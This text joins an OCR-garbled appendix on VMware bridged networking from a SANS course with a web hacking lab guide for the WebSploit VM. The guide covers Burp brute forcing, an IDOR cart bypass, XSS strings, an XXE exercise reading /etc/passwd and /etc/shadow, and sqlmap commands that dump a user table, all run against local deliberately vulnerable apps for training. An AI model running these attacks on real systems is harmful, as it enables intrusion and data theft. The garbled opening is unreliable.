VMware Player (aka VMware Workstation Player) 
VMware recently renamed its products. If your Windows VMware program has the word "Player" in it, please 
use this section. 
Go to Player-> Removable Devices -> Network Adapter-> Settings. 
Connect to \/'~·Aware Horizon rUX Server 
Manage 
FullScreen 
Unity 
Ctrl+E 
Ctrl+Alt+Enter 
Printer 
../ 
Sound Card 
Wes.tern Digital My Pa.ssport0820 
Upek. Biometric Coprocessor 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Appendix 6.1 - VMware Bridged Mode How-To 
Choose "Bridged" and ensure "Connected" is checked. Then, click "Configure Adapters" (if available). 
Then, deselect all adapters except your wired Ethernet adapter and press "OK". 
'---' 
'-...,I 
'-....; 
'---' 
. .___, 
'-...,I 
'---' 
'---' 
'--' 
'---' 
'--' 
'-../ 
'--' 
'--' 
'--' 
'-../ 
•.___/ 
'---' 
'---' 
'---' 
'---' 
'---' 
'-..../ 
'-../ 
'-../ 
'---' 
'--' 
'--' 
'---' 
'--' 
'--' 
'---' 
'-..../ 
'---' 
'---' 
Older versions of VMware Player may lack the Configure Adapters option. In that case, disabling your wireless 
adapter usually forces VMware Player to automatically bridge to wired. 
'---' 
'--' 
'-....; 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Appendix 6.1 -VMware Bridged Mode How-To 
2 
'--' 
'-.../ 
'--' 
VMware Workstation (aka VMware Workstation Pro) 
Configure bridged networking by going to VM -> Removable Devices-> Network Adapter-> Settings. 
Choose "Bridged" and ensure "Connected" is checked. 
Then, go to Edit-> Virtual Network Editor. 
Parte 
Virtual Netvvork Editor ... 
If VMnetO does not appear, click "Change Settings" to modify network settings: 
Name 
Type 
External Connection 
\/Mnet8 
~JAT 
Host Connection 
DHCP 
Subnet Address 
Connected 
Connected 
Enabled 
10.0.0.0 
Enabled 
192.168.10.0 
VMnet Information 
firidged {connect Vf.-1s directly b the external nttNDTk) 
!'JAT {shared host's IP address 
~ DHCE. Settings... 
. I 
Subnet lP: 
192 , 168 , 2 
• J 
Subnet mask: 
2 5 5 
Admiriistrator privneges are required to modify the network configuration. [~!,;;_!,ange Setpngs ! 
Help 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Appendix 6.1 -VMware Bridged Mode How-To 
3 
Change from "Automatic" to your actual wired Ethernet adapter. Note: Your Ethernet adapter name may be 
different. 
\/Mneta 
Bridged 
Auto-bridging 
VMnetl 
Host-only 
Connected 
Enabled 
192163.2.0 
\/Mnet2 
Host-only 
Connected 
Enabled 
10.0.0.0 
\/Mnet3 
NAT 
NAT 
Connected 
Enabled 
192.168. lO.D 
[ .. Adr:lNet!No1~ .• ,..] [Remove Net.wor~.J 
\/Mnet Informabon 
,~ Bridged (connect VMs directly to the external network} 
-------------------------;;; [ Automabc.~~tl!r111s ... ] 
NAT Setbni,;J~~,, 
t;,d:1pter VMnetO 
service to disb-ibuie IP adth,rn to 1/M~ 
QHC? Settings ... 
Subrlt't JP: 
[ R.esrore Defaults] 
Subne,ma"k' 
Cancel 
Help 
Then, press Apply. VMnetO should be bridged to the actual wired Ethernet adapter. 
Name 
Type 
External Connection 
Host Connection 
DHCP 
Subnet Address 
- 
~---- 
~~,i~i. iffl~ed 
Int.i:f(RU3~ 
!Jja Ne ••• 
\/Mnet1 
Host-only 
- 
Connected 
\/Mnet2 
1/Mnets 
Host;:.nly 
NAT 
NAT 
Connected 
Connected 
Enabled 
Enabled 
Enabled 
192..168.2.0 
10.0.0.0 
192.168.10.0 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Appendix 6.1 - VMware Bridged Mode How-To 
\..._,, 
\..._,, 
'-" 
'-" 
'-" 
'-..., 
'-.J 
'-" 
'-" 
\..._,, 
'-..., 
'-----' 
'-" 
'-..., 
'-..., 
'-..., 
'-.J 
'-" 
'-" 
'-.J 
'-" 
'-" 
'-.J 
'----' 
'---' 
'--' 
'-" 
'-..., 
'-.J 
'-..., 
'-" 
'-" 
'-.J 
'-.J 
'-.J 
'-..., 
'---" 
'---" 
'-" 
4 
'-..., 
'-../ 
'-.J 
VMware Fusion 
Go to Virtual Machine -> Network Adapter-> Network Adapter Settings. 
VMware Fusion 
File 
Edit 
View 
Window 
Help 
• 
Choose your wired Ethernet adapter. Assuming it is plugged into the wired network and operational, it should 
have a green icon and show a 10.5.100.0/24 address when selected . 
• 
SoowAlf 
,,...., 
a Connect Network Adapter 
,,,..._ 
This network adapter is configured to use: 
' e Autodetect 
" Thunderbolt Ettlemet 
• Thunderbolt Ethemet 3 
• Wi•fi 
I' iPhone US:f3 
J II Bluetooth PAN 
Custom 
Iii Private to my Ma.c 
•STY,¢#C- •>% m'>- c•d A·- ~C0%w# 
> AdVanced optiOns 
Add Device .•• 
The virtual machlna appmn • 
an addition.al 
~ter Of! the physical ai.Mt netwo:l'k 
"ThllndetbO!i Et~I 2'. 
Name: Thunder ... themet 2 
Ethernet 
IP: 10.5,100.246 
Subnet Mask: 2l:i5,256.0,0 
1 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Appendix 6.1 -VMware Bridged Mode How-To 
5 
 
 
 
Intense Introduction to Modern Web 
Application Hacking 
Lab Guide 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
  Omar Ωr Santos (@santosomar)  
 
 
1 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
Introduction 
This course starts with an introduction to modern web applications and immediately starts diving 
directly into the mapping and discovery phase of testing. In this course, you will learn new 
methodologies used and adopted by many penetration testers and ethical hackers. This is a 
hands-on training where will use various open source tools and learn how to exploit SQL 
injection, command injection, cross-site scripting (XSS), XML External Entity (XXE), and 
cross-site request forgery (CSRF).  
 
WebSploit VM 
Your laptop has been preloaded with a VM that contains Kali Linux and several vulnerable 
applications. You can download the VM to practice at your own time at: 
https://websploit.h4cker.org  
 
IMPORTANT​: This VM contains vulnerable software! DO NOT connect to a production 
environment and use with caution!!! The purpose of this VM is to have a lightweight (single VM) 
with a few web application penetration testing tools, as well as vulnerable applications. 
 
Vulnerable Applications Included 
●
Damn Vulnerable Web Application (DVWA) 
●
WebGoat 
●
Hackazon 
●
OWASP Mutillidae 2 
●
OWASP Juice Shop 
 
VM Creds: 
Username: root
Password: toor 
 
 
 
 
 
 
Omar Ωr Santos (@santosomar) 
2 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
Additional Resources: 
●
The Art of Hacking Websit​e (​https://theartofhacking.org​): The Art of Hacking is a series 
of video courses and live training sessions in Safari that is a complete guide to help you 
get up and running with cybersecurity and pen testing career. These video courses 
provide step-by-step real-life scenarios. This website has been created to provide 
supplemental material to reinforce some of the critical concepts and techniques that the 
student has learned and links a​ ​GitHub repository ​that hosts scripts and code that help 
you build your own hacking environment, examples of real-life penetration testing 
reports, and more.  
●
Video course​: ​Hacking Web Applications The Art of Hacking Series LiveLessons: 
Security Penetration Testing for Today's DevOps and Cloud Environments 
●
The H4cker GitHub Repository (​https://h4cker.org/github​):  Over 6,000 references and 
resources related to ethical hacking / penetration testing, digital forensics and incident 
response (DFIR), vulnerability research, exploit development, reverse engineering, and 
more.  
●
How to Build Your Own Lab 
●
Safari Live Training​ (free with a Safari subscription): ​https://theartofhacking.org/training  
 
 
 
Omar Ωr Santos (@santosomar) 
3 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
Docker Containers 
All of the vulnerable servers are running in Docker containers.  The Docker service is ​not 
started at boot time.​  This is to prevent the vulnerable applications to be exposed by default. 
Please use the following command to start it: 
 
service docker start 
 
The following are all the Docker containers included in the WebSploit VM: 
 
 
WebSploit VM Details 
 
 
 
 
Omar Ωr Santos (@santosomar) 
4 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
To obtain the status of each docker container use the ​sudo docker ps​ command. 
 
Tip​: Watch ​Overview of Web Applications for Security Professionals 
Exercise 1: Authentication and Session 
Management Vulnerabilities 
Tip​: Watch ​Auth and Session Management Vulnerabilities video 
An attacker can bypass authentication in vulnerable systems via several methods. The following 
are the most common ways that you can take advantage of authentication-based vulnerabilities 
in an affected system: 
●
Credential brute forcing 
●
Session hijacking 
●
Redirect 
●
Default credentials 
●
Weak credentials 
●
Kerberos exploits 
●
Malpractices in OAuth/OAuth2, SAML, OpenID implementations 
 
A large number of web applications keep track of information about each user for the duration of 
the web transactions. Several web applications have the ability to establish variables like access 
rights and localization settings and many others. These variables apply to each and every 
interaction a user has with the web application for the duration of the session. 
Exercise 1a: Fingerprinting the Web Framework and 
Programming Language used in the Backend 
1.
In this exercise you will try to determine what type of programming language and 
backend infrastructure is used by looking at ​sessions IDs​. However, first you need to 
configure your browser to send traffic to the proxy (you can use Burp Suite or OWASP 
ZAP).  Navigate to ​Preferences​: 
Omar Ωr Santos (@santosomar) 
5 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
2.
Then navigate to ​Network Proxy > Settings​. 
 
 
Omar Ωr Santos (@santosomar) 
6 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
3.
Configure the proxy as shown below. Make sure that the “​No proxy for​” 
box does not have any entry on it. 
 
 
 
 
 
4.
Once you configure the proxy navigate to the ​Damn Vulnerable Web App (DVWA) 
http://127.0.0.1:6663​ . You may need to ​Create​/​Reset​ the Database.  
 
Omar Ωr Santos (@santosomar) 
7 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
5.
When you are asked for a password use ​admin / password​. 
6.
Once you login to DVWA, launch Burp, navigate to ​Proxy > Intercept​ and turn on 
Intercept​. 
 
 
 
 
 
Omar Ωr Santos (@santosomar) 
8 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
7.
Go back to DVWA and navigate to Brute Force, while capturing the requests and 
responses. Identify the session ID and write down the web framework and programming 
language used by the application below: 
 
Answer: ___________________________ 
 
8.
Familiarize yourself with ​Burp​, as we will be using it extensively throughout the course. 
Click through each of the message editor tabs (Raw, Headers, etc.) to see the different 
ways of analyzing the message. 
 
9.
Click the "​Forward​" button to send the request to the server. In most cases, your 
browser will make more than one request in order to display the page (for images, etc.). 
Look at each subsequent request and then forward it to the server. When there are no 
more requests to forward, your browser should have finished loading the URL you 
requested. 
 
10. You can go to the ​Proxy History​ tab. This contains a table of all HTTP messages that 
have passed through the Proxy. Select an item in the table, and look at the HTTP 
messages in the request and response tabs. If you select the item that you modified, you 
will see separate tabs for the original and modified requests. 
 
11. Click on a column header in the Proxy history. This sorts the contents of the table 
according to that column. Click the same header again to reverse-sort on that column, 
and again to clear the sorting and show items in the default order. Try this for different 
columns. 
 
12. Within the history table, click on a cell in the leftmost column, and choose a color from 
the drop-down menu. This will highlight that row in the selected color. In another row, 
double-click within the Comment column and type a comment. You can use highlights 
and comments to annotate the history and identify interesting items. 
 
 
●
Burp CA certificate​ - Since Burp breaks SSL connections between your 
browser and servers, your browser will by default show a warning message if you 
visit an HTTPS site via Burp Proxy. This is because the browser does not 
recognize Burp's SSL certificate, and infers that your traffic may be being 
intercepted by a third-party attacker. To use Burp effectively with SSL 
connections, you really need to ​install Burp's Certificate Authority master 
certificate​ in your browser, so that it trusts the certificates generated by Burp. 
Omar Ωr Santos (@santosomar) 
9 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
A few additional details that are also documented at: 
https://portswigger.net/burp/documentation/desktop/tools/proxy/using 
 
When you have things set up, visit any URL in your browser, and go to the ​Intercept tab​ in Burp 
Proxy. If everything is working, you should see an HTTP request displayed for you to view and 
modify. You should also see entries appearing in the ​Proxy history​ tab. You will need to forward 
HTTP messages as they appear in the Intercept tab, in order to continue browsing. 
Intercepting requests and responses 
The ​Intercept tab​ displays individual HTTP requests and responses that have been intercepted 
by Burp Proxy for review and modification. This feature is a key part of Burp's user-driven 
workflow: 
●
Manually reviewing intercepted messages is often key to understanding the application's 
attack surface in detail. 
●
Modifying request parameters often allows you to quickly identify common security 
vulnerabilities. 
Intercepted requests and responses are displayed in an ​HTTP message editor​, which contains 
numerous features designed to help you quickly analyze and manipulate the messages. 
By default, Burp Proxy intercepts only request messages, and does not intercept requests for 
URLs with common file extensions that are often not directly interesting when testing (images, 
CSS, and static JavaScript). You can change this default behavior in the ​interception options​. 
For example, you can configure Burp to only intercept ​in-scope​ requests containing parameters, 
or to intercept all responses containing HTML. Furthermore, you may often want to turn off 
Burp's interception altogether, so that all HTTP messages are automatically forwarded without 
requiring user intervention. You can do this using the master interception toggle, in the ​Intercept 
tab​. 
Using the Proxy history 
Burp maintains a ​full history​ of all requests and responses that have passed through the Proxy. 
This enables you to review the browser-server conversation to understand how the application 
functions, or carry out key testing tasks. Sometimes you may want to completely disable 
interception in the ​Intercept tab​, and freely browse a part of the application's functionality, before 
carefully reviewing the resulting requests and responses in the Proxy history. 
Burp provides the following functions to help you analyze the Proxy history: 
●
The ​history table​ can be sorted by clicking on any column header (clicking a header 
cycles through ascending sort, descending sort, and unsorted). This lets you quickly 
group similar items and identify any anomalous items. 
●
You can use the ​display filter​ to hide items with various characteristics. 
●
You can ​annotate​ items with highlights and comments, to describe their purpose or 
identify interesting items to come back to later. 
Omar Ωr Santos (@santosomar) 
10 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
●
You can open additional views of the history using the ​context menu​, to 
apply different filters or help test access controls. 
Burp Proxy testing workflow 
A key part of Burp's ​user-driven workflow​ is the ability to send interesting items between Burp 
tools to carry out different tasks. For example, having observed an interesting request in the 
Proxy, you might: 
●
Quickly perform a ​vulnerability scan​ of just that request, using Burp Scanner. 
●
Send the request to ​Repeater​ to manually modify the request and reissue it over and 
over. 
●
Send the request to ​Intruder​ to perform various types of automated customized attacks. 
●
Send the request to ​Sequencer​ to analyze the quality of randomness in a token returned 
in the response. 
You can perform all these actions and various other using the context menus that appear in 
both the ​Intercept tab​ and the ​Proxy history​. 
 
 
 
 
Omar Ωr Santos (@santosomar) 
11 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
Exercise 1b: Brute Forcing the Application 
1.
In this exercise you will try to bruteforce the admin password. This is a very simple 
example and should not take you more than 2-3 minutes. Set the DVWA Security Level 
to low, as shown below: 
 
 
 
2.
Navigate to DVWA and ​Brute Force​ again and type admin and any password. 
 
 
 
 
 
Omar Ωr Santos (@santosomar) 
12 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
3.
Go back to Burp and right click on the ​Intercept​ window and select “​Send to Intruder​”. 
 
 
 
4.
Navigate to ​Intruder > Positions​ and click on the ​Clear​ button. 
 
 
 
Omar Ωr Santos (@santosomar) 
13 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
5.
We can brute force any elements, but for this simple example we will just brute force the 
password. 
 
 
 
6.
Navigate to ​Payloads​. Due to the lack of time of this “​intense​” introduction class, we will 
just use a simple list and cheat a little. In the real world, you can use ​wordlists​.  
 
 
Omar Ωr Santos (@santosomar) 
14 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
Note​: You can only use wordlists in the Pro version of Burp; however, you can use the 
OWASP Zed Attack Proxy (ZAP) to also perform this task. As described by OWASP, the 
OWASP Zed Attack Proxy (ZAP) “is one of the world’s most popular free security tools 
and is actively maintained by hundreds of international volunteers.” Many offensive and 
defensive security engineers around the world use ZAP, which not only provides web 
vulnerability scanning capabilities but also can be used as a sophisticated web proxy. 
ZAP comes with an API and also can be used as a fuzzer. You can download and obtain 
more information about OWASP’s ZAP from 
https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project​.  
You  will see other examples using ZAP later in the course. 
 
 
7.
Navigate to the ​Options​ tab and go under Grep Match.  The “Grep - Match” option can 
be used to flag result items containing specified expressions in the response. For each 
item configured in the list, Burp will add a new results column containing a checkbox 
indicating whether the item was found in each response. You can then sort on this 
column (by clicking the column header) to group the matched results together. Using this 
option can be very powerful in helping to analyze large sets of results, and quickly 
identifying interesting items. In password guessing attacks, scanning for phrases such as 
"password incorrect" or "login successful" can locate successful logins; in testing for SQL 
injection vulnerabilities, scanning for messages containing "ODBC", "error", etc. can 
identify vulnerable parameters. In our example, let’s add the word “Welcome”, as shown 
below. 
 
Omar Ωr Santos (@santosomar) 
15 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
7. Click “​Start attack​”. The window below will be shown -- and once the attack is successful, 
you will see the “Welcome message” in the HTML, as shown below. You can even click on the 
Render​ tab to show the page as if it was seen in a web browser. 
 
 
 
 
 
 
Omar Ωr Santos (@santosomar) 
16 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
Exercise 1c: Bypassing Authorization 
In this exercise we will use the ​OWASP Juice Shop​ (​http://127.0.0.1:6662​) and the 
OWASP Zed Attack Proxy (ZAP)​. The OWASP Juice Shop is an intentionally insecure 
web application written entirely in JavaScript which encompasses the entire OWASP 
Top Ten and other severe security flaws. 
 
1.
BONUS POINT (in under 60 seconds): The OWASP Juice Shop is a 
“capture-the-flag-like” application. Navigate to the OWASP Juice Shop 
(​http://127.0.0.1:6662​) and try to find the hidden scoring board for the “CTF”. You only 
need your browser.  
 
Answer: _______________________________________ 
 
2.
In the OWASP Juice Shop, navigate to Login and create a user. 
 
3.
Make a note of the password and username you used, since you will need it later. 
 
 
Omar Ωr Santos (@santosomar) 
17 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
4.
Login​ to the Juice Shop using those credentials. 
5.
Launch ​ZAP​ in Kali by navigating to ​Applications > Web Application Analysis > 
OWASP ZAP​, as shown below: 
 
6.
Add any item to your cart in the Juice Shop. 
 
7.
Make sure that your browser’s proxy settings are configured correctly. 
 
8.
In the OWASP ZAP click on the Set Break for all requests and responses icon, as shown 
below.  
 
 
 
9.
Navigate to your cart in the Juice Shop and capture the HTTP Request. You will observe 
a flaw where the request includes the ​basket ID​ in the ​URL​ (looks like a REST API 
request). 
Omar Ωr Santos (@santosomar) 
18 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
10. Right click on the ​Request​ window and select ​Open/Resend with Request Editor... 
 
 
11. Edit the basket ID to #1 and send the request. 
 
Omar Ωr Santos (@santosomar) 
19 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
 
12. You should now see someone else’s cart and the success message below should be 
shown (after you forward all packets to the web application / Juice Shop). 
 
 
Note​: There are several other authentication and session based attacks that you can perform 
with the Juice Shop. Navigate to the scoreboard that you found earlier to obtain more 
information about other ​flags​ / ​attacks​ that you can perform on your own. 
 
 
 
Omar Ωr Santos (@santosomar) 
20 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
Exercise 2: Reflected XSS 
Tip​: ​Watch XSS and CSRF videos 
Exercise 2a: Evasions 
 What type of vulnerabilities can be triggered by using the following string?  
<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&# 
x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> 
 
 
Answer:___________________________ 
 
Exercise 2b: Reflected XSS 
1.
Launch the Juice Shop application/site.  
 
2.
Perform a Reflected XSS. You only need your browser for this attack. Find out how the 
Juice Shop is susceptible to XSS. 
 
You can use the following string: 
<script>alert("XSS")</script> 
 
 
 
 
Exercise 2c: DOM-based XSS 
1.
Find a DOM-based XSS in the Juice Shop application/site. You only need your browser 
for this attack. Find out how the Juice Shop is susceptible to DOM-based XSS. 
 
You can use the following string: 
<script>alert("XSS")</script> 
 
Omar Ωr Santos (@santosomar) 
21 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
Exercise 3: Stored (persistent) XSS 
1.
Go to the DVWA in your browser and make sure that the ​DVWA Security​ is set to ​low​. 
2.
Navigate to the ​XSS (Stored)​ tab. There you can access a guestbook. Notice how the 
page echoes the user input in the guestbook. 
 
 
3.
Test for XSS, as shown below: 
 
 
Omar Ωr Santos (@santosomar) 
22 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
4.
You should get a popup message, as shown below: 
 
 
5.
Notice how the message will reappear after you navigate outside of that page and come 
back to the same guest book. That is the main difference between a stored (persistent) 
XSS and a reflected XSS. 
 
 
Note​: These XSS exercises should not take you more than 2 minutes each. If you are done 
early, familiarize yourself with other ways on how to perform XSS testing at: 
http://h4cker.org/go/xss 
 
 
 
Omar Ωr Santos (@santosomar) 
23 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
Exercise 4: Exploiting XXE Vulnerabilities 
An XML External Entity attack is a type of attack against an application that parses XML 
input.  
●
This attack occurs when XML input containing a reference to an external entity is 
processed by a weakly configured XML parser.  
●
This attack may lead to the disclosure of confidential data, denial of service, 
server side request forgery, port scanning from the perspective of the machine 
where the parser is located, and other system impacts. Attacks can include 
disclosing local files, which may contain sensitive data such as passwords or 
private user data, using file: schemes or relative paths in the system identifier.  
●
Since the attack occurs relative to the application processing the XML document, 
an attacker may use this trusted application to pivot to other internal systems, 
possibly disclosing other internal content via http(s) requests or launching a 
CSRF attack to any unprotected internal services.  
●
In some situations, an XML processor library that is vulnerable to client-side 
memory corruption issues may be exploited by dereferencing a malicious URI, 
possibly allowing arbitrary code execution under the application account.  
●
Other attacks can access local resources that may not stop returning data, 
possibly impacting application availability if too many threads or processes are 
not released. 
 
1.
Access WebGoat using your browser (​http://127.0.0.1:6661/WebGoat​). 
 
2.
Register a new user (username: ​testuser​ and password: ​testing​). 
 
3.
Navigate to ​Injection Flaws > XXE​.  
 
4.
Feel free to read the explanation of XXE (which I copied and pasted above) from 
WebGoat.  
 
5.
Then navigate to the WebGoat ​Step 3​, as shown in the following figure. 
Omar Ωr Santos (@santosomar) 
24 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
 
6.
Launch Burp and make sure that ​Intercept is on​. Make sure that your browser proxy 
settings are set correctly. 
 
 
 
Omar Ωr Santos (@santosomar) 
25 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
7.
Go back to ​WebGoat​ and enter a comment in the web form (any text) and click ​Submit​. 
 
 
8.
Go back to ​Burp​ and you will see the ​HTTP POST message​ shown below: 
 
 
9.
Let’s modify that message and type our own XML “code”. 
 
 
 
Omar Ωr Santos (@santosomar) 
26 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
10. Forward​ the ​POST​ to the web server. This should cause the application to show a list of 
files after the comment “OMAR_WAS_HERE”, as shown below (of course, use whatever 
text you want in your own example): 
 
 
11. Now, in your own, try to list the contents of the ​/etc/passwd​ file using a similar 
approach. 
 
12. Try to access the contents of the ​/etc/shadow​ file. Were you successful? If not, why? 
 
 
Exercise 5: SQL Injection using SQLmap 
Utilizing the results of previous reconnaissance efforts, you have discovered that your target has 
a public facing web site.  Now you need to find a way to gain access to the backend database 
on the server.  Of course, there are a number of tools available that can be used.  A very simple 
way to look for flaws in web applications is to look at the actual http requests and responses. 
To do this we will use the Burp suite interception proxy.  This lab starts out with a basic 
walkthrough of Burp Suite,  helping us to find an SQL Injection vulnerability in our target.  We 
finish up by utilizing SQLmap to pillage the back-end database.  Have fun and please ask 
questions if you get stuck. 
 
1.
We will start by configuring the browser in Kali to send our web traffic through Burp 
Suite.  If this is already done you can move on to the next step.  The manual way to do 
this is in the browser preferences seen below.  
Omar Ωr Santos (@santosomar) 
27 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
However,  we have also installed a handy ​proxy switcher add-on​.  You can see it in the 
right side of the toolbar.  ​Clicking​ the icon shown below turns on the proxy.  You will see 
the icon turn ​red​.  The drop down arrow allows you to manage multiple proxies. 
 
 
2.
Let’s first start Burp Suite by opening a terminal window and typing ​burpsuite​ at the 
command line. 
 
3.
You will see the ​Burp​ splash screen. 
 
4.
Next, open the web browser. 
 
Omar Ωr Santos (@santosomar) 
28 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
5.
Now we want to start browsing the target website.  In the URL bar, access the target  
site ​http://127.0.0.1​  Once there, click around the site and submit any forms you find.. 
 
 
6. Go to Burp Suite and find your requests in the ​Proxy->Intercept​ tab. 
 
8.
The request should start with something like ​GET / HTTP/1.1​ with several headers. You 
can modify any of these if you want, and then click Forward, this will forward your 
request to the server. The response will be sent to your browser. Alternate between 
Firefox and Burp Suite, forwarding requests and watching them come up in Firefox. 
 
Omar Ωr Santos (@santosomar) 
29 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
9.
In the ​Proxy->Intercept​ tab toggle ​intercept​ so the button reads ​Intercept is off​. This 
will forward all pending and future requests to Firefox 
 
10. Notice the ​Proxy->HTTP​ history tab has the history of all your requests. Click on one of 
these, and examine the request and the response. Find the various formats, such as 
raw, hex, html, and rendered under the ​Request​ and ​Response​ tabs. 
 
 
 
Ok, our target is hackazon.net,  which is running on ​http://127.0.0.1​. 
 
The first thing we need to do is to determine where there might be possible sql injection.  Like 
we mentioned previously,  this is usually found in input fields.  We can try to identify these flaws 
manually or we can use an automated scanner to identify possible sql injection. In this case we 
are going to utilize burp intruder to send SQL injection strings. 
 
 
Omar Ωr Santos (@santosomar) 
30 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
11.  Let's start by going back to the HTTP history tab to look for a possible place to inject. 
Find the request with the URL “​product/view?id=​”. 
 
12. Right click​ and select “​Send to Intruder​” 
 
13. Move over to the “​Intruder​” tab and select the “​Positions​” tab.  
 
 
Omar Ωr Santos (@santosomar) 
31 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
14. The screen shown below is displayed. Click the ​Clear​ button on the right side of the 
screen. 
 
 
15. Then inside the request, highlight the number after ​“id=”​ and click the ​Add​ button.  This 
selects the exact field that we want to inject into. 
 
 
16. Click on the ​Payloads​ tab and navigate to the “​Payload type​” pull down menu. 
 
Omar Ωr Santos (@santosomar) 
32 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
17. Select “​Runtime file​” from the pull down menu. 
 
 
 
18. Click the “Select file” button, as demonstrated in the following figure. Select the file 
“​~/Downloads/MySQL.txt​” 
 
Note​: Fuzzdb is a large dictionary list of attack patterns, wordlists, etc. Selecting this file 
loads a list of SQL injection strings into ​Burpsuite​ for the ​Intruder​ tool to send to the 
selected field. 
Omar Ωr Santos (@santosomar) 
33 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
17. You are now ready to launch the attack by clicking the “Start attack” button on the top 
right. This will open another window showing the progress of the attack.  
 
 
18. Once the attack is finished take a look at the ​Status​ column.  Notice there are different 
types of error message codes (i.e., 200, 400 and 500 error messages).  The 500 error 
messages could be a clue that the application may be susceptible to SQL injection. 
 
 
Omar Ωr Santos (@santosomar) 
34 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
You can now take this URL and use it with ​sqlmap​ for further testing and potential 
exploitation.  
 
Tip​: Now you know that the vulnerable application/site is vulnerable to SQL injection flaw 
in the URL ​“127.0.0.1/category/view?id=2”. 
 
19. Run the following command from the CLI:  
 
 sqlmap -u http://127.0.0.1/category/view?id=2 
 
sqlmap​ will begin to probe and query the database via the URL provided. The results 
will be displayed in real time.  
 
20. The tool will detect that the back-end database is a MySQL database.  Select “​Y​” to skip 
payloads for other databases. 
 
 
Omar Ωr Santos (@santosomar) 
35 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
21. You should see the message shown below stating that the application is susceptible to 
blind SQL injection. 
 
 
 
22. Answer ​“Y”​ to the question about trying injection with random integer values. 
 
 
23. The next message confirms that the “​id​” parameter is indeed vulnerable to SQL injection 
and asks if you would like to test all other parameters.  Optionally, you can continue with 
further testing or if you are running out of time you can answer “​N​” to stop testing here. 
 
 
 
24. You can now start running additional commands to learn more about the database. 
Enter the following command in the Kali terminal window: 
 
sqlmap -u http://127.0.0.1/category/view?id=2 --dbs 
 
This command should tell you what databases are currently available on the server. 
Omar Ωr Santos (@santosomar) 
36 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
25. Run the following command: 
 
sqlmap -u http://127.0.0.1/category/view?id=2 --tables 
 
 
This command will dump the list of ​tables​ available in the ​hackazon​ database, as shown 
in the next figure. 
Omar Ωr Santos (@santosomar) 
37 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
 
26. Run the following command to dump the list of columns in the database: 
 
sqlmap -u http://127.0.0.1/category/view?id=2 --columns 
 
  
You should see an output similar to the one displayed in the following figure. 
 
Omar Ωr Santos (@santosomar) 
38 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
Now you should have enough information to retrieve the data from the database. 
As you can see here, the table “​tbl_users​” contains some interesting columns. 
  
27. Run the following command  to dump the contents of the table: 
 
sqlmap -u http://127.0.0.1/category/view?id=2 --dump -T tbl_users 
 
 
28. Answer ​No (N) ​to the question “​do you want to store hashes to a temporary file for 
eventual further processing with other tools​” 
You can also perform a dictionary-based attack to crack the password hashes found in 
the database. If you are running out of time or if you have a slow system, answer ​No (N).
Omar Ωr Santos (@santosomar) 
39 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
As you can see from the results in the figure above,  the credit card information is stored 
unencrypted on the database.  
 
 
 
Exercise 6: Exploiting Weak Cryptographic 
Implementations 
This exercise is for informational purposes only. If your machine does not have access to the 
Internet. However, you can do this against any other systems you may have in your own lab. 
 
1.
You can use ​nmap​ to enumerate weak ciphers, as shown below: 
nmap --script ssl-cert,ssl-enum-ciphers -p 443 theartofhacking.org 
 
Omar Ωr Santos (@santosomar) 
40 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
 
2.
There are many other open source and commercial tools that can be used to find weak 
ciphers and cryptographic implementations. However, a very useful open source tool is 
testssl.sh (​http://testssl.sh​).  
 
 
Omar Ωr Santos (@santosomar) 
41 
 
 
Intense Introduction to Modern Web Application Hacking – Lab Guide 
 
3.
